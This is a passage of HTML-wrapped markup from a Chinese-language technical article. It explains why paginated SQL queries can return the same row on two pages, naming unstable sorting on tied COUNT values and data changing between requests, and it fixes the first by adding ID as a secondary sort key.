data-annotation-key="gkann_2595452670" data-annotation-type="annotation"><span data-slate-string="true">3</span></span></span><span 
data-slate-leaf="true" data-offset-key="1509:19"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 208px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <h2 class="se-108781df" data-slate-type="heading" data-slate-object="block" 
data-key="1510"><span data-slate-object="text" data-key="1511"><span data-slate-leaf="true" 
data-offset-key="1511:0" data-first-offset="true"><span data-slate-string="true">重复数据的问题</span></span></span></h2> 
<div class="se-0058a48c " data-slate-type="paragraph" data-slate-object="block" data-key="1512"> 
<span data-slate-object="text" data-key="1513"><span data-slate-leaf="true" data-offset-key="1513:0" 
data-first-offset="true"><span data-slate-string="true">下面我们再看一个分页的常见问题——不同页之间的重复数据。</span></span></span> 
</div> <div class="se-7419377e " data-slate-type="paragraph" data-slate-object="block" data-key="1514"> 
<span data-slate-object="text" data-key="1515"><span data-slate-leaf="true" data-offset-key="1515:0" 
data-first-offset="true"><span data-slate-string="true">这个问题指的是，某一条数据，在查询某一个接口第一页的时候，就返回了；可是查询第二页的时候，又返回了。</span></span></span> 
</div> <div class="se-6ac40146 " data-slate-type="paragraph" data-slate-object="block" data-key="1516"> 
<span data-slate-object="text" data-key="1517"><span data-slate-leaf="true" data-offset-key="1517:0" 
data-first-offset="true"><span data-slate-string="true">我来举个例子：</span></span></span> </div> 
<div class="se-f449ad4e se-c4c48ed2" data-slate-type="pre" data-slate-object="block" data-key="1518" 
data-code-language="sql"> <div class="se-68b31f5c se-369db0d6"> <span></span> </div> <div class="se-2427ba70"> 
<div class="se-80a95c72 se-d6177208" data-code-line-number="1"></div> </div> <div class="se-789aaab1 
ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1519"> <span data-slate-object="text" data-key="1520"><span data-slate-leaf="true" 
data-offset-key="1520:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4127370029" data-annotation-type="annotation"><span data-slate-string="true">select</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:1"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1520:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0712963281" data-annotation-type="annotation"><span data-slate-string="true">NAME</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:3"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1520:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9541182912" data-annotation-type="annotation"><span data-slate-string="true">DESC</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1520:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8952381658" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:7"><span data-slate-string="true"> PRODUCTS </span></span><span 
data-slate-leaf="true" data-offset-key="1520:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4415804746" data-annotation-type="annotation"><span data-slate-string="true">order</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1520:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4245698319" data-annotation-type="annotation"><span data-slate-string="true">by</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1520:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2171641900" data-annotation-type="annotation"><span data-slate-string="true">COUNT</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:13"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1520:14"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6652527605" data-annotation-type="annotation"><span data-slate-string="true">desc</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:15"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1520:16"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1743352166" data-annotation-type="annotation"><span data-slate-string="true">limit</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:17"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1520:18"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_9164374457" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:19"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1520:20"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4799061151" data-annotation-type="annotation"><span data-slate-string="true">50</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:21"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 266px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-e5f8bc0f " data-slate-type="paragraph" data-slate-object="block" 
data-key="1521"> <span data-slate-object="text" data-key="1522"><span data-slate-leaf="true" 
data-offset-key="1522:0" data-first-offset="true"><span data-slate-string="true">这个查询是要根据产品的数量倒序排序，然后列出第一页（前 
50 条）来。</span></span></span> </div> <div class="se-4c291353 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1523"> <span data-slate-object="text" data-key="1524"><span data-slate-leaf="true" 
data-offset-key="1524:0" data-first-offset="true"><span data-slate-string="true">接着查询第二页：</span></span></span> 
</div> <div class="se-9ee09502 se-82b368bb" data-slate-type="pre" data-slate-object="block" 
data-key="1525" data-code-language="sql"> <div class="se-6d8c6451 se-79bc0ecd"> <span></span> 
</div> <div class="se-9a223126"> <div class="se-6a83efba se-3480ae8a" data-code-line-number="1"></div> 
</div> <div class="se-102c4c87 ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1526"> <span data-slate-object="text" data-key="1527"><span 
data-slate-leaf="true" data-offset-key="1527:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_5321719621" data-annotation-type="annotation"><span 
data-slate-string="true">select</span></span></span><span data-slate-leaf="true" data-offset-key="1527:1"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1527:2"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_3821435644" 
data-annotation-type="annotation"><span data-slate-string="true">NAME</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:3"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1527:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3125616946" data-annotation-type="annotation"><span data-slate-string="true">DESC</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1527:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6695609264" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:7"><span data-slate-string="true"> PRODUCTS </span></span><span 
data-slate-leaf="true" data-offset-key="1527:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2622772773" data-annotation-type="annotation"><span data-slate-string="true">order</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1527:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5770940825" data-annotation-type="annotation"><span data-slate-string="true">by</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1527:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9081059009" data-annotation-type="annotation"><span data-slate-string="true">COUNT</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:13"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1527:14"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8575200463" data-annotation-type="annotation"><span data-slate-string="true">desc</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:15"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1527:16"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2740997921" data-annotation-type="annotation"><span data-slate-string="true">limit</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:17"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1527:18"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4861688569" data-annotation-type="annotation"><span data-slate-string="true">50</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:19"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1527:20"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_7430304929" data-annotation-type="annotation"><span data-slate-string="true">50</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:21"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 262px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-bb41fe2d " data-slate-type="paragraph" data-slate-object="block" 
data-key="1528"> <span data-slate-object="text" data-key="1529"><span data-slate-leaf="true" 
data-offset-key="1529:0" data-first-offset="true"><span data-slate-string="true">结果发现有某一个产品数据，同时出现在第一页和第二页上。按理说，这是不应当发生的，这条数据要么在第一页，要么在第二页，怎么能同时在第一页和第二页上呢？</span></span></span> 
</div> <div class="se-7db7c736 " data-slate-type="paragraph" data-slate-object="block" data-key="1530"> 
<span data-slate-object="text" data-key="1531"><span data-slate-leaf="true" data-offset-key="1531:0" 
data-first-offset="true"><span data-slate-string="true">其实，这只是问题现象，而其中的原因是不确定的，比如说有这样两种可能。</span></span></span> 
</div> <h3 class="se-c3f3e2b5" data-slate-type="heading" data-slate-object="block" data-key="1532"><span 
data-slate-object="text" data-key="1533"><span data-slate-leaf="true" data-offset-key="1533:0" 
data-first-offset="true"><span data-slate-string="true">排序不稳定</span></span></span></h3> <div 
class="se-162ad52e " data-slate-type="paragraph" data-slate-object="block" data-key="1534"> 
<span data-slate-object="text" data-key="1535"><span data-slate-leaf="true" data-offset-key="1535:0" 
data-first-offset="true"><span data-slate-string="true">第一种是因为查询的结果排序不稳定。</span></span></span> 
</div> <div class="se-1c6ed650 " data-slate-type="paragraph" data-slate-object="block" data-key="1536"> 
<span data-slate-object="text" data-key="1537"><span data-slate-leaf="true" data-offset-key="1537:0" 
data-first-offset="true"><span data-slate-string="true">说到这个“不稳定”，其实本质上就是排序算法的“不稳定”。如果对算法中的排序算法比较熟悉的话，你应该知道，</span></span></span><span 
data-slate-object="text" data-key="1538"><span data-slate-leaf="true" data-offset-key="1538:0" 
data-first-offset="true"><span class="se-9f59446a" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">我们说排序算法稳不稳定，说的是当两个元素对排序来说“相等”的时候，是不是能够维持次序和排序前一样。</span></span></span></span><span 
data-slate-object="text" data-key="1539"><span data-slate-leaf="true" data-offset-key="1539:0" 
data-first-offset="true"><span data-slate-string="true">比如有这样一组数：</span></span></span> </div> 
<div class="se-704d2ae7 se-9834f505" data-slate-type="pre" data-slate-object="block" data-key="1540"> 
<div class="se-d5353a27 se-7884b981"> <span></span> </div> <div class="se-9008a5e4"> <div class="se-a7343691 
se-a31257a2" data-code-line-number="1"></div> </div> <div class="se-026ea238 ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="1541"> <span data-slate-object="text" 
data-key="1542"><span data-slate-leaf="true" data-offset-key="1542:0" data-first-offset="true"><span 
data-slate-string="true">1, 2a, 5, 2b, 3</span></span></span> </div> <div class="ps__rail-x" 
style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 
0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div class="ps__thumb-y" 
tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> <div class="se-2747090c 
" data-slate-type="paragraph" data-slate-object="block" data-key="1543"> <span data-slate-object="text" 
data-key="1544"><span data-slate-leaf="true" data-offset-key="1544:0" data-first-offset="true"><span 
data-slate-string="true">这里面有两个 2，但是为了区分，其中一个叫做 2a，另一个叫做 2b。现在 2a 在 2b 前面，如果排序以后，2a 还是能够保证排在 
2b 前面，那么这个排序就是稳定的，反之则是不稳定的。有很多排序是稳定的，比如冒泡排序、插入排序，还有归并排序；但也有很多是不稳定的，比如希尔排序、快排和堆排序。</span></span></span> 
</div> <div class="se-3aa88620 " data-slate-type="paragraph" data-slate-object="block" data-key="1545"> 
<span data-slate-object="text" data-key="1546"><span data-slate-leaf="true" data-offset-key="1546:0" 
data-first-offset="true"><span data-slate-string="true">再回到我们的问题上，分页查询是根据 COUNT 来排序的，如果多条数据，它们的 
COUNT 一样，而在某些数据库（包括某些特定版本）下，查询的排序是不稳定的。这样就可能出现，这个相同 COUNT 的产品记录，在结果集中出现的顺序不一致的问题，那也就可能出现某条记录在第一页的查询中出现过了，而在第二页的查询中又出现了一遍。</span></span></span> 
</div> <div class="se-e73df6b2 " data-slate-type="paragraph" data-slate-object="block" data-key="1547"> 
<span data-slate-object="text" data-key="1548"><span data-slate-leaf="true" data-offset-key="1548:0" 
data-first-offset="true"><span data-slate-string="true">其实，从数据库的角度来说，在我们根据上述代码要求数据库返回数据的时候，COUNT 
相同的情况下，可并没有要求数据库一定要严格遵循某一个顺序啊，因此严格说起来，数据库这么做本身也是没有什么不对的。</span></span></span> </div> <div class="se-43bd6167 
" data-slate-type="paragraph" data-slate-object="block" data-key="1549"> <span data-slate-object="text" 
data-key="1550"><span data-slate-leaf="true" data-offset-key="1550:0" data-first-offset="true"><span 
data-slate-string="true">无论如何，问题如果明确是这一个，那么解决方法就比较清楚了。既然问题只会在 COUNT 相同的时候出现，那么上例中，我们给 order 
by 增加一个次要条件——ID，而因为 ID 是表的主键，不可能出现重复，因此在 COUNT 相同的时候排序一定是严格按照 ID 来递减的，这样也就可以保证排序不会因为“不稳定”而造成问题：</span></span></span> 
</div> <div class="se-59d6b96e se-fa39a68e" data-slate-type="pre" data-slate-object="block" 
data-key="1551" data-code-language="sql"> <div class="se-a0fc6e9c se-ef6155d8"> <span></span> 
</div> <div class="se-77804545"> <div class="se-8713e4cc se-bbb0c8a7" data-code-line-number="1"></div> 
</div> <div class="se-f4b6266f ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1552"> <span data-slate-object="text" data-key="1553"><span 
data-slate-leaf="true" data-offset-key="1553:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_8847830714" data-annotation-type="annotation"><span 
data-slate-string="true">select</span></span></span><span data-slate-leaf="true" data-offset-key="1553:1"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1553:2"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_8773396568" 
data-annotation-type="annotation"><span data-slate-string="true">NAME</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:3"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1553:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7703644019" data-annotation-type="annotation"><span data-slate-string="true">DESC</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1553:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3305484724" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:7"><span data-slate-string="true"> PRODUCTS </span></span><span 
data-slate-leaf="true" data-offset-key="1553:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0113656430" data-annotation-type="annotation"><span data-slate-string="true">order</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1553:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8168955878" data-annotation-type="annotation"><span data-slate-string="true">by</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1553:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3079922797" data-annotation-type="annotation"><span data-slate-string="true">COUNT</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:13"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1553:14"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8713655647" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:15"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1553:16"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9726319729" data-annotation-type="annotation"><span data-slate-string="true">desc</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:17"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1553:18"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0917313093" data-annotation-type="annotation"><span data-slate-string="true">limit</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:19"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1553:20"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_9874565468" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:21"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1553:22"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_7660544090" data-annotation-type="annotation"><span data-slate-string="true">50</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:23"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 251px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <h3 class="se-addfca21" data-slate-type="heading" data-slate-object="block" 
data-key="1554"><span data-slate-object="text" data-key="1555"><span data-slate-leaf="true" 
data-offset-key="1555:0" data-first-offset="true"><span data-slate-string="true">数据本身变化</span></span></span></h3> 
<div class="se-291fd062 " data-slate-type="paragraph" data-slate-object="block" data-key="1556"> 
<span data-slate-object="text" data-key="1557"><span data-slate-leaf="true" data-offset-key="1557:0" 
data-first-offset="true"><span data-slate-string="true">第二个造成重复数据问题的原因是数据本身的变化。</span></span></span> 
</div> <div class="se-506760c2 " data-slate-type="paragraph" data-slate-object="block" data-key="1558"> 
<span data-slate-object="text" data-key="1559"><span data-slate-leaf="true" data-offset-key="1559:0" 
data-first-offset="true"><span data-slate-string="true">这个也不难理解，比如还是上面这行 SQL：</span></span></span> 
</div> <div class="se-5031919a se-dd8b0a4b" data-slate-type="pre" data-slate-object="block" 
data-key="1560" data-code-language="sql"> <div class="se-3cd4d8cd se-ab70bd73"> <span></span> 
</div> <div class="se-acb19242"> <div class="se-91ddd6a4 se-d933fb75" data-code-line-number="1"></div> 
</div> <div class="se-b7ef82b3 ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1561"> <span data-slate-object="text" data-key="1562"><span 
data-slate-leaf="true" data-offset-key="1562:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_1545224953" data-annotation-type="annotation"><span 
data-slate-string="true">select</span></span></span><span data-slate-leaf="true" data-offset-key="1562:1"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1562:2"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_2774702198" 
data-annotation-type="annotation"><span data-slate-string="true">NAME</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:3"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1562:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8498764925" data-annotation-type="annotation"><span data-slate-string="true">DESC</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1562:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2623575424" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:7"><span data-slate-string="true"> PRODUCTS </span></span><span 
data-slate-leaf="true" data-offset-key="1562:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9809265575" data-annotation-type="annotation"><span data-slate-string="true">order</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1562:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4493941389" data-annotation-type="annotation"><span data-slate-string="true">by</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1562:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1025687921" data-annotation-type="annotation"><span data-slate-string="true">COUNT</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:13"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1562:14"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7183837999" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:15"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1562:16"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0282939120" data-annotation-type="annotation"><span data-slate-string="true">desc</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:17"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1562:18"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1426332100" data-annotation-type="annotation"><span data-slate-string="true">limit</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:19"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1562:20"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_3336571790" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:21"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1562:22"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_1385526577" data-annotation-type="annotation"><span data-slate-string="true">50</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:23"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 251px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-04e22763 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1563"> <span data-slate-object="text" data-key="1564"><span data-slate-leaf="true" 
data-offset-key="1564:0" data-first-offset="true"><span data-slate-string="true">本来有一行数据是在第二页的开头，用户在上述查询执行后，这行数据突然发生了变化，COUNT 
增加了不少，于是挤到第一页去了，那么相应地，第一页的最后一条数据就被挤到第二页了，于是这时候用户再来查询第二页的数据：</span></span></span> </div> <div 
class="se-939fe67f se-c7f0ed72" data-slate-type="pre" data-slate-object="block" data-key="1565" 
data-code-language="sql"> <div class="se-18489062 se-9455d523"> <span></span> </div> <div class="se-bc83538c"> 
<div class="se-b8b4dabd se-bf921635" data-code-line-number="1"></div> </div> <div class="se-ce7df1fa 
ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1566"> <span data-slate-object="text" data-key="1567"><span data-slate-leaf="true" 
data-offset-key="1567:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0052156816" data-annotation-type="annotation"><span data-slate-string="true">select</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:1"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1567:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5021865794" data-annotation-type="annotation"><span data-slate-string="true">NAME</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:3"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1567:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7774332410" data-annotation-type="annotation"><span data-slate-string="true">DESC</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1567:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0452245175" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:7"><span data-slate-string="true"> PRODUCTS </span></span><span 
data-slate-leaf="true" data-offset-key="1567:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4044636337" data-annotation-type="annotation"><span data-slate-string="true">order</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1567:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9559188671" data-annotation-type="annotation"><span data-slate-string="true">by</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1567:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1368581736" data-annotation-type="annotation"><span data-slate-string="true">COUNT</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:13"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1567:14"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4734668102" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:15"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1567:16"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6324954984" data-annotation-type="annotation"><span data-slate-string="true">desc</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:17"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1567:18"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0961293986" data-annotation-type="annotation"><span data-slate-string="true">limit</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:19"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1567:20"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_5894025429" data-annotation-type="annotation"><span data-slate-string="true">50</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:21"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1567:22"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6017229672" data-annotation-type="annotation"><span data-slate-string="true">50</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:23"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 247px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-5b5b743c " data-slate-type="paragraph" data-slate-object="block" 
data-key="1568"> <span data-slate-object="text" data-key="1569"><span data-slate-leaf="true" 
data-offset-key="1569:0" data-first-offset="true"><span data-slate-string="true">这就发现原来第一页尾部的一条数据，又出现在了第二页的开头。</span></span></span> 
</div> <div class="se-709ec3ba " data-slate-type="paragraph" data-slate-object="block" data-key="1570"> 
<span data-slate-object="text" data-key="1571"><span data-slate-leaf="true" data-offset-key="1571:0" 
